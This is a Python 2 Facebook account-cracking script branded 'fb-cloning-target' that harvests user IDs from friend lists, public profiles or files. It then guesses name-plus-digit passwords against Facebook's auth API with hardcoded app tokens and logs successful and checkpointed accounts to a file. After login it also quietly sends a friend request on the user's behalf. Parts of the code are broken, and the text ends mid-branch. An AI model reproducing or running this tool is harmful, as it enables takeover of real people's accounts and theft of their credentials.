#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;97mToken\033[1;91m : \033[1;95mCopy👉 \033[1;92m                              \033[1;96m👈 Without fb ID free login Copy Paste & Enter👉\033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		Name = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()


#### LOGO ####
logo = """
\033[1;93m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
\033[1;93m$$$$$$$$$$$$$$$$Y/'$$$$P'a$$$$$$$$$$$$$$$$
\033[1;93m$$$$$$$$$",` /,/,mT$$$$ d$$$$$$$$$$$$$$$$$
\033[1;93m$$$$$l',` , '/d$$$$P^$a `^a`W$$$$$$$$$$$$$
\033[1;91m$$l', ` ,   |d$$$P^$'   _  _ ==~a$$$$$$$$$
\033[1;91m$l.`  .     \'i$^4'   _eP$$$$$$$$$$$$$$$$$
\033[1;97ml '  .         /   ,  $$$$' `$~$$$$$$$$$$$
\033[1;97m; ' ,              l /^' .,$oa$$$$$$$$$$$$
\033[1;92mb ' ,        .     (_ ,1$$$$$$'$$$$$$$$$$$
\033[1;92m$ , ,      .;       _$$$$$$$P $a$$$$$$$$$$
\033[1;93m$, ,`    .$Ly        lM"^ ,  ,$$$$$$$'$$$$
\033[1;93m$$, ,`   d$Liy      /'   edb $$$$$$$'$$$$$
\033[1;93m$$$$,,'. $$$Li     (    d$$$$$$$$$$'$$$$$$
\033[1;93m$$$$$$,' v$$$Li4.   `  `Q$$$$$$$P',$$$$$$$
\033[1;93m$$$$$$$$,$$$$$$$L44., . .     ,,;d$$$$$$$$
\033[1;93m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
\033[1;93m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
\033[0;95m╭═══════════════════════════════════════════════════════════════════════╮
\033[0;91m║\033[0;91mAUTHOR : \033[0;92mShuBhamg0sain                     \033[0;91m           ║
\033[0;91m║\033[0;91mGITHUB :\033[0;92m https://github.com/ShuBhamg0sain   \033[0;91m          ║
\033[0;91m║\033[0;91mFB PAGE :\033[0;92m https://m.facebook.com/shubham.gosain.980\033[0;91m   ║
\033[0;95m╰═══════════════════════════════════════════════════════════════════════╯
\033[1;94m⊱══════════════════⊱═⊰DISCLAIMER⊱═⊰══════════════════⊰
\033[1;91mWARNING :\033[1;93mUSE A FRESH ACCOUNT TO LOGIN, DO NOT USE OLD ACCOUNT LOGIN OTHERWISE YOUR ACCOUNT WILL BE BLOCK
\033[1;91mWIFI OR MOBILE DATA :\033[1;93mDO NOT USE WIFI, ONLY MOBILE DATA USE FOR CLONING 
\033[1;91mID NOT FOUND PROBLEM :\033[1;93mCOPY TO PROFILE PHOTO USERNAME AND THEN PASTE IN TERMUX
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mLoging In \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•"
jalan(' \033[1;92m	                                   ') 
jalan('\033[1;97m                      :::!~!!!!!:.') 
jalan('\033[1;97m                  .xUHWH!! !!?M88WHX:.') 
jalan('\033[1;97m                .X*#M@$!!  !X!M$$$$$$WWx:.') 
jalan('\033[1;97m               :!!!!!!?H! :!$!$$$$$$$$$$8X:') 
jalan('\033[1;97m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:') 
jalan('\033[1;97m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!') 
jalan('\033[1;97m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!') 
jalan('\033[1;97m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!') 
jalan('\033[1;91m               ~?WuxiW*`   `"#$$$$8!!!!??!!!') 
jalan('\033[1;91m             :X- M$$$$       `"T#$T~!8$WUXU~') 
jalan('\033[1;91m            :%`  ~#$$$m:        ~!~ ?$$$$$$') 
jalan('\033[1;91m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"') 
jalan('\033[1;97m.....   -~~\033[1;91m:<` !    ~?T#$$@@W@*?$$      /`') 
jalan('\033[1;97mW$@@M!!! .!~~ \033[1;91m!!     .:XUW$W!~ `"~:    :') 
jalan('\033[1;97m#"~~`.:x%`!!  \033[1;91m!H:   !WM$$$$Ti.: .!WUn+!`') 
jalan('\033[1;97m:::~:!!`:X~ .:\033[1;92m ?H.!u "$$$B$$$!W:U!T$$M~') 
jalan('\033[1;97m.~~   :X@!.-~   \033[1;92m?@WTWo("*$$$W$TH$! `') 
jalan('\033[1;97mWi.~!X$?!-~    : \033[1;92m?$$$B$Wu("**$RM!') 
jalan('\033[1;97m$R@i.~~ !     :   \033[1;92m~$$$$$B$$en:``     ') 
jalan('\033[1;97m?MXT@Wx.~    :     \033[1;92m~"##*$$$$M~   ') 
jalan('\033[1;47m                  \033[1;31mShuBhamg0sain                \033[1;0m     ') 
jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 
jalan('\033[1;91m      \033[1;91m ENTER TOOL USERNAME AND PASSWORD \033[1;0m     ') 
jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 

jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("    \033[1;93m▇▇\033[1;95m       WellCome to fb-cloning-target  \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;91m              👇  AUTHOR  👇          \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m          This Tools Is Created By    \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m                ShuBhamg0sain         \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m       WhatsApp  Number 03000000000   \033[1;93m▇▇")
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")

CorrectUsername = "g0sain"
CorrectPassword = "Cl0ning"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \033[1;91mUSERNAME \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \033[1;91mPASSWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:ShuBhamg0sain
            loop = 'false'
        else:
            print "Serious Please"
            os.system('xdg-open ')
    else:
        print "Wrong Dear!"
        os.system('xdg-open ')

####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m1.\x1b[1;96m Login With Facebook  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m2.\x1b[1;95m Login With Token"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m3.\x1b[1;93m Get Access Token App Fb"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m0.\033[1;91m Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;96mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan("\033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account")
		jalan("\033[1;91mWarning  \033[1;92mUse a New Account To Login")
		print('\033[1;97m\x1b[1;96m................LOGIN WITH FACEBOOK................\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;93mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;93mPassword      \x1b[1;93m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://youtu.be/Zt2VGpyLCzU')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		Name = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:ShuBhamg0sain
        time.sleep(0.05)
	print logo
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•"
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;97m"+Name+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;97m"+id+"\x1b[1;97m              "
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•"
	print "\x1b[1;96m[\x1b[1;93m1\x1b[1;96m]\x1b[1;93m Hack Facebook Account"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Logout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Remove The Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mAMIR*BABER\033[1;96m•◈•───────────────•◈•"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m] \033[1;93mApni hack from your I'd friends"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m] \033[1;93mApny hack from public I'd"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m] \033[1;93mList hack from file"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m] \033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•"
		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•"
		idt = raw_input("\033[1;96m[+] \033[1;37mEnter Friend ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mFriend Name\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mFriend List Public error !"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•"
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mfile error'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	time.sleep(0.05)
	jalan('\033[1;96m[✺] \033[1;92mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
		time.sleep(0.05)
	print
	print('\x1b[1;96m[!] \033[1;92mStop CTRL+z')
	time.sleep(0.05)
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mAMIR*BABER\033[1;96m•◈•───────────────•◈•"
	print ('\033[1;96m[\033[1;92mO\033[1;93mR\033[1;96m]  \033[1;93m    User ID    \033[1;96m| \033[1;93mPassword \033[1;96m  - \033[1;93m ID Name')
			
	def main(arg):
                global cekpoint,oks
		user = arg
		try:
			os.mkdir('sg')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
                        pass1 = b['first_name']+'1'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
                                else: 
                                        pass2 = b['first_name']+'12'
			                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			                q = json.load(data)
			                if 'access_token' in q:
				                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
				                oks.append(user+pass2)
			                else:
				                if 'www.facebook.com' in q["error_msg"]:
					                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
					                cek = open("sg/ok_cp.txt", "a")
					                cek.write(user+"|"+pass2+"\n")
					                cek.close()
					                cekpoint.append(user+pass2)
                                                else:
                                                        pass3 = b['first_name']+'123'
			                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			                                q = json.load(data)
			                                if 'access_token' in q:
				                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
				                                oks.append(user+pass3)
			                                else:
				                                if 'www.facebook.com' in q["error_msg"]:
					                                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
					                                cek = open("sg/ok_cp.txt", "a")
					                                cek.write(user+"|"+pass3+"\n")
					                                cek.close()
					                                cekpoint.append(user+pass3)
                                                                else:
                                                                        pass4 = b['first_name']+'12'
			                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			                                                q = json.load(data)
			                                                if 'access_token' in q:
				                                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
				                                                oks.append(user+pass4)
			                                                else:
				                                                if 'www.facebook.com' in q["error_msg"]:
					                                                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
  					                                                cek = open("sg/ok_cp.txt", "a")
				                                                  	cek.write(user+"|"+pass4+"\n")
					                                                cek.close()
					                                                cekpoint.append(user+pass4)
                                                                                else:
                                                                                        pass5 = b['first_name']+'12'
			                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			                                                                q = json.load(data)
			                                                                if 'access_token' in q:
				                                                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
				                                                                oks.append(user+pass5)
			                                                                else:
                                                                      				if 'www.facebook.com' in q["error_msg"]:
                                                                 					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
                                                                 					cek = open("sg/ok_cp.txt", "a")
                                                                  					cek.write(user+"|"+pass5+"\n")
                                                                     					cek.close()
                                                                  					cekpoint.append(user+pass5)
                                                                                                else:
                                                                                                        pass6 = b['first_name']+'12'
                                                                                     			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
	                                                                                     		q = json.load(data)
                                                                                 			if 'access_token' in q:
				                                                                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
				                                                                                oks.append(user+pass6)
			                                                                                else:
				                                                                                if 'www.facebook.com' in q["error_msg"]:
					                                                                                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
					                                                                                cek = open("sg/ok_cp.txt", "a")
					                                                                                cek.write(user+"|"+pass6+"\n")
					                                                                                cek.close() 
					                                                                                cekpoint.append(user+pass6)
                                                                                                                else:
                                                                                                                        pass7 = b['first_name']+'12'
			                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			                                                                                                q = json.load(data)
			                                                                                                if 'access_token' in q:
				                                                                                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
                                                                                  				                oks.append(user+pass7)
                                                                                        			        else:
                                                                                   				                if 'www.facebook.com' in q["error_msg"]:
                                                                                     					                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
					                                                                                                cek = open("sg/ok_cp.txt", "a")
					                                                                                                cek.write(user+"|"+pass7+"\n")
					                                                                                                cek.close()
					                                                                                                cekpoint.append(user+pass7)
                                                                                                                                else:
                                                                                                                                        pass8 = b['first_name']+'12'
			                                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			                                                                                                                q = json.load(data)
                                                                                                                     			if 'access_token' in q:
				                                                                                                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
				                                                                                                                oks.append(user+pass8)
			                                                                                                                else:
                        				                                                                                        if 'www.facebook.com' in q["error_msg"]:
				           	                                                                                                        print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
					                                                                                                                cek = open("sg/ok_cp.txt", "a")
					                                                                                                                cek.write(user+"|"+pass8+"\n")                                   
					                                                                                                                cek.close()
					                                                                                                                cekpoint.append(user+pass8)
                                                                                                                                                else:
                                                                                                                                                        pass9 = b['last_name']+'1'
				                                                                                                             	        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					                                                                                                                q = json.load(data)
					                                                                                                                if 'access_token' in q:
                           						                                                                                        print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
            						                                                                                                        oks.append(user+pass9)
           					                                                                                                        else:
 						                                                                                                                if 'www.facebook.com' in q["error_msg"]:
							                                                                                                                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
							                                                                                                                cek = open("sg/ok_cp.txt", "a")
          							                                                                                                        cek.write(user+"|"+pass9+"\n") 
       							                                                                                                                cek.close()
        							                                                                                                        cekpoint.append(user+pass9)
						                                                                                                                else:
                                                                                                                                                                        pass10 = b['last_name']+'1'
 					                                                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				                                                                                                                                       	q = json.load(data)
				                                                                                                                                    	if 'access_token' in q:
					                                                                                                                                  	print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
				                                                                                                                                 		oks.append(user+pass9)
				                                                                                                                                   	else:
					                                                                                                                                	if 'www.facebook.com' in q["error_msg"]:
						                                                                                                                                       	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
						                                                                                                                                	cek = open("sg/ok_cp.txt", "a")
						                                                                                                                                     	cek.write(user+"|"+pass10+"\n")
						                                                                                                                                      	cek.close()
						                                                                                                                                  	cekpoint.append(user+pass10)
					                                                                                                                                      	else:
                                                                                                                                                                                        pass11 = b['last_name']+'1'
				                                                                                                                                                   	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				                                                                                                                                                     	q = json.load(data)
				                                                                                                                                                   	if 'access_token' in q:
					                                                                                                                                                	print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
					                                                                                                                                                     	oks.append(user+pass11)
				                                                                                                                                                    	else:
					                                                                                                                                                 	if 'www.facebook.com' in q["error_msg"]:
						                                                                                                                                                	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
						                                                                                                                                                  	cek = open("sg/ok_cp.txt", "a")
						                                                                                                                                                  	cek.write(user+"|"+pass11+"\n")
						                                                                                                                                                    	cek.close()
						                                                                                                                                                   	cekpoint.append(user+pass11)
					                                                                                                                                                     	else:
    					                                                                                                                                                     	        pass12 = b['last_name']+'1'
